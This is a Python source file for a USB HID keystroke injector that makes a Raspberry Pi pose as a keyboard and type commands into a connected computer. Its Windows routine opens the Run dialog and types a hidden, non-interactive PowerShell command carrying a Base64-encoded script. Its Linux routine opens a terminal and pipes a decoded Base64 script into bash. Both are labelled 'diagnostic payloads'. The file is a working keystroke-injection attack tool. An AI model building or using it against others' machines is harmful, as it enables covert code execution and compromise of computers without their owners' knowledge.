"""
REI - USB HID Keyboard Injector
Generates and transmits standard 8-byte HID keyboard reports via /dev/hidg0.
Supports Base64-resilient payload typing for Windows and Linux endpoints.
Includes safe dry-run / mock simulation when running off-Pi or when gadget node is missing.
"""

import base64
import logging
import os
import random
import time
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger("REI.Core.HIDInjector")

# Standard HID Keyboard Modifiers (Byte 0)
MOD_NONE = 0x00
MOD_LEFT_CTRL = 0x01
MOD_LEFT_SHIFT = 0x02
MOD_LEFT_ALT = 0x04
MOD_LEFT_GUI = 0x08  # Windows / Super Key
MOD_RIGHT_CTRL = 0x10
MOD_RIGHT_SHIFT = 0x20
MOD_RIGHT_ALT = 0x40  # AltGr
MOD_RIGHT_GUI = 0x80

# Standard HID Keycodes (Byte 2)
KEY_NONE = 0x00
KEY_ENTER = 0x28
KEY_ESCAPE = 0x29
KEY_BACKSPACE = 0x2A
KEY_TAB = 0x2B
KEY_SPACE = 0x2C
KEY_MINUS = 0x2D
KEY_EQUAL = 0x2E
KEY_LEFTBRACE = 0x2F
KEY_RIGHTBRACE = 0x30
KEY_BACKSLASH = 0x31
KEY_SEMICOLON = 0x33
KEY_APOSTROPHE = 0x34
KEY_GRAVE = 0x35
KEY_COMMA = 0x36
KEY_DOT = 0x37
KEY_SLASH = 0x38
KEY_CAPSLOCK = 0x39
KEY_F1 = 0x3A
KEY_F2 = 0x3B
KEY_F3 = 0x3C
KEY_F4 = 0x3D
KEY_F5 = 0x3E
KEY_F6 = 0x3F
KEY_F7 = 0x40
KEY_F8 = 0x41
KEY_F9 = 0x42
KEY_F10 = 0x43
KEY_F11 = 0x44
KEY_F12 = 0x45
KEY_RIGHT = 0x4F
KEY_LEFT = 0x50
KEY_DOWN = 0x51
KEY_UP = 0x52

# Mapping for ASCII characters to (modifier, keycode)
# Focused on characters needed for command line and Base64 strings [A-Za-z0-9+/=_-]
ASCII_TO_HID: Dict[str, Tuple[int, int]] = {
    # Letters
    **{chr(c): (MOD_NONE, 0x04 + (c - ord('a'))) for c in range(ord('a'), ord('z') + 1)},
    **{chr(c): (MOD_LEFT_SHIFT, 0x04 + (c - ord('A'))) for c in range(ord('A'), ord('Z') + 1)},
    # Numbers
    '1': (MOD_NONE, 0x1E), '2': (MOD_NONE, 0x1F), '3': (MOD_NONE, 0x20),
    '4': (MOD_NONE, 0x21), '5': (MOD_NONE, 0x22), '6': (MOD_NONE, 0x23),
    '7': (MOD_NONE, 0x24), '8': (MOD_NONE, 0x25), '9': (MOD_NONE, 0x26),
    '0': (MOD_NONE, 0x27),
    # Common command line characters
    ' ': (MOD_NONE, KEY_SPACE),
    '\n': (MOD_NONE, KEY_ENTER),
    '\r': (MOD_NONE, KEY_ENTER),
    '\t': (MOD_NONE, KEY_TAB),
    '-': (MOD_NONE, KEY_MINUS),
    '_': (MOD_LEFT_SHIFT, KEY_MINUS),
    '=': (MOD_NONE, KEY_EQUAL),
    '+': (MOD_LEFT_SHIFT, KEY_EQUAL),
    '/': (MOD_NONE, KEY_SLASH),
    '\\': (MOD_NONE, KEY_BACKSLASH),
    '.': (MOD_NONE, KEY_DOT),
    ',': (MOD_NONE, KEY_COMMA),
    ':': (MOD_LEFT_SHIFT, KEY_SEMICOLON),
    ';': (MOD_NONE, KEY_SEMICOLON),
    '"': (MOD_LEFT_SHIFT, KEY_APOSTROPHE),
    "'": (MOD_NONE, KEY_APOSTROPHE),
    '|': (MOD_LEFT_SHIFT, KEY_BACKSLASH),
    '$': (MOD_LEFT_SHIFT, 0x21),  # Shift + 4
    '%': (MOD_LEFT_SHIFT, 0x22),  # Shift + 5
    '&': (MOD_LEFT_SHIFT, 0x24),  # Shift + 7
    '*': (MOD_LEFT_SHIFT, 0x25),  # Shift + 8
    '(': (MOD_LEFT_SHIFT, 0x26),  # Shift + 9
    ')': (MOD_LEFT_SHIFT, 0x27),  # Shift + 0
    '{': (MOD_LEFT_SHIFT, KEY_LEFTBRACE),
    '}': (MOD_LEFT_SHIFT, KEY_RIGHTBRACE),
    '[': (MOD_NONE, KEY_LEFTBRACE),
    ']': (MOD_NONE, KEY_RIGHTBRACE),
    '<': (MOD_LEFT_SHIFT, KEY_COMMA),
    '>': (MOD_LEFT_SHIFT, KEY_DOT),
    '@': (MOD_LEFT_SHIFT, 0x1F),  # Shift + 2
    '!': (MOD_LEFT_SHIFT, 0x1E),  # Shift + 1
    '#': (MOD_LEFT_SHIFT, 0x20),  # Shift + 3
    '?': (MOD_LEFT_SHIFT, KEY_SLASH),
}

NULL_REPORT = bytes([0] * 8)


class USBHIDInjector:
    """
    Handles hardware USB HID Keyboard emulation via Linux USB gadget (/dev/hidg0).
    Provides safe dry-run fallback when the hardware gadget device node is not available.
    """

    DEFAULT_DEVICE_NODE = "/dev/hidg0"

    def __init__(self, device_node: Optional[str] = None):
        self.device_node = device_node or self.DEFAULT_DEVICE_NODE
        self._is_simulated = (
            os.getenv("REI_DRY_RUN") == "1" or
            not os.path.exists(self.device_node) or
            not os.access(self.device_node, os.W_OK)
        )
        if self._is_simulated:
            logger.info(f"HID Injector initialized in SIMULATION mode (node '{self.device_node}' unavailable or DRY_RUN).")
        else:
            logger.info(f"HID Injector initialized with hardware node: {self.device_node}")

    @property
    def is_simulated(self) -> bool:
        return self._is_simulated

    def _write_raw_report(self, report: bytes) -> bool:
        """Writes an 8-byte HID report to /dev/hidg0."""
        if len(report) != 8:
            raise ValueError(f"HID report must be exactly 8 bytes, got {len(report)}")

        if self._is_simulated:
            logger.debug(f"[SIM HID] Report: {report.hex()}")
            return True

        try:
            with open(self.device_node, "wb", buffering=0) as f:
                f.write(report)
            return True
        except Exception as ex:
            logger.error(f"Error writing to HID gadget {self.device_node}: {ex}")
            return False

    def send_keystroke(
        self,
        keycode: int,
        modifier: int = MOD_NONE,
        press_duration: float = 0.015,
        release_duration: float = 0.015,
    ) -> bool:
        """
        Sends a key press followed by a key release with microsecond timing.
        """
        # Key down report: [modifier, reserved, keycode, 0, 0, 0, 0, 0]
        press_report = bytes([modifier, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])
        ok1 = self._write_raw_report(press_report)
        if not self._is_simulated:
            time.sleep(press_duration)

        # Key release report: [0, 0, 0, 0, 0, 0, 0, 0]
        ok2 = self._write_raw_report(NULL_REPORT)
        if not self._is_simulated:
            time.sleep(release_duration)
        return ok1 and ok2

    def send_key_combination(
        self,
        keys: List[int],
        modifier: int = MOD_NONE,
        press_duration: float = 0.04,
        release_duration: float = 0.04,
    ) -> bool:
        """
        Sends a multi-key shortcut report (e.g. GUI+R or CTRL+ALT+T).
        """
        report_keys = (keys[:6] + [0] * 6)[:6]
        report = bytes([modifier, 0x00] + report_keys)
        ok1 = self._write_raw_report(report)
        if not self._is_simulated:
            time.sleep(press_duration)
        ok2 = self._write_raw_report(NULL_REPORT)
        if not self._is_simulated:
            time.sleep(release_duration)
        return ok1 and ok2

    def type_text(
        self,
        text: str,
        char_delay_min: float = 0.010,
        char_delay_max: float = 0.025,
    ) -> bool:
        """
        Types an ASCII string character by character with subtle timing jitter
        to prevent USB host buffer overflow and simulate natural typing.
        """
        if self._is_simulated:
            for ch in text:
                if ch not in ASCII_TO_HID:
                    logger.warning(f"Unmapped ASCII character '{ch}' (ord {ord(ch)}) skipped.")
            return True

        for ch in text:
            mapping = ASCII_TO_HID.get(ch)
            if not mapping:
                logger.warning(f"Unmapped ASCII character '{ch}' (ord {ord(ch)}) skipped.")
                continue

            modifier, keycode = mapping
            jitter = random.uniform(char_delay_min, char_delay_max)
            success = self.send_keystroke(
                keycode=keycode,
                modifier=modifier,
                press_duration=jitter,
                release_duration=jitter,
            )
            if not success:
                return False

        return True

    def inject_windows_powershell(
        self,
        ps_script: str,
        execution_delay: float = 1.0,
    ) -> bool:
        """
        Executes an in-memory PowerShell script on a Windows endpoint via Win+R.
        Converts the script to UTF-16LE Base64 (-EncodedCommand) for 100% syntax preservation
        and immunity to host keyboard layout variations (Spanish vs US QWERTY).
        """
        logger.info("Injecting Windows PowerShell diagnostic payload via Win+R...")

        # 1. Trigger Run Dialog (Win + R)
        self.send_key_combination(keys=[0x15], modifier=MOD_LEFT_GUI)
        if not self._is_simulated:
            time.sleep(execution_delay)

        # 2. Encode script as UTF-16LE Base64 for PowerShell -EncodedCommand
        utf16_bytes = ps_script.encode("utf-16le")
        b64_str = base64.b64encode(utf16_bytes).decode("ascii")

        # Command runner: opens hidden non-interactive powershell
        cmd = f"powershell -NoP -W Hidden -NonI -Enc {b64_str}\n"

        logger.debug(f"Typing Windows launcher command ({len(cmd)} chars)...")
        success = self.type_text(cmd)
        return success

    def inject_linux_bash(
        self,
        bash_script: str,
        execution_delay: float = 1.0,
    ) -> bool:
        """
        Executes an in-memory Bash script on a Linux endpoint via terminal or runner.
        Presses Ctrl+Alt+T (or Alt+F2 fallback), then pipes Base64 payload to bash.
        """
        logger.info("Injecting Linux Bash diagnostic payload via terminal shortcut...")

        # 1. Open terminal using Ctrl + Alt + T (scancode 't' = 0x17)
        self.send_key_combination(keys=[0x17], modifier=MOD_LEFT_CTRL | MOD_LEFT_ALT)
        if not self._is_simulated:
            time.sleep(execution_delay)


        # 2. Encode script as standard UTF-8 Base64
        b64_payload = base64.b64encode(bash_script.encode("utf-8")).decode("ascii")

        # Command: echo <b64> | base64 -d | bash
        cmd = f"echo {b64_payload} | base64 -d | bash\n"

        logger.debug(f"Typing Linux launcher command ({len(cmd)} chars)...")
        success = self.type_text(cmd)
        return success
